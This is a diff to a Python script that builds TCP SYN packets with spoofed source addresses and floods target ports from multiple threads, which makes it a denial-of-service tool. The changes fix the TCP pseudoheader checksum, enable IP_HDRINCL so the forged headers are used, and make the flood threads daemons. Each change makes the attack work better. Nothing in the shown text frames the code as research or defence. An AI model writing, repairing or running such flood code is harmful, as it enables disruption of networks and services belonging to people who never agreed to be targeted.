@@ -70,11 +70,11 @@ def build_tcp_header(spoofed_src_ip, spoofed_src_port, dst_ip, dst_port, payload
             0                   # urgent pointer
     )
 
-    packet = struct.pack('!4s4sBBH', socket.inet_aton(spoofed_src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header) + payload_size)
-    packet = packet + tcp_header
+    pseudoheader = struct.pack('!4s4sBBH', socket.inet_aton(spoofed_src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header) + payload_size)
+    temp_packet = pseudoheader + tcp_header
 
     # remake tcp header with correct checksum
-    tcp_checksum = checksum(packet)
+    tcp_checksum = checksum(temp_packet)
     tcp_header = struct.pack("!HHLLBBHHH", spoofed_src_port, dst_port, 0, 0, 0x50, 0x02, 8192, tcp_checksum, 0)
 
     return tcp_header
@@ -119,8 +119,10 @@ def flood_threaded(num_threads, dst_ip, dst_ports, packets):
     try:
         for _ in range(num_threads):
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             thread = threading.Thread(target=flood, args=(sock, dst_ip, dst_ports, packets))
             threads.append(thread)
+            thread.daemon = True
             thread.start()
         
         for thread in threads:
@@ -128,6 +130,7 @@ def flood_threaded(num_threads, dst_ip, dst_ports, packets):
     
     except KeyboardInterrupt:
         print("\nStopping all threads...")
+        sys.exit()
 
 
 def main(src_ip, src_port, dst_ip, dst_ports):
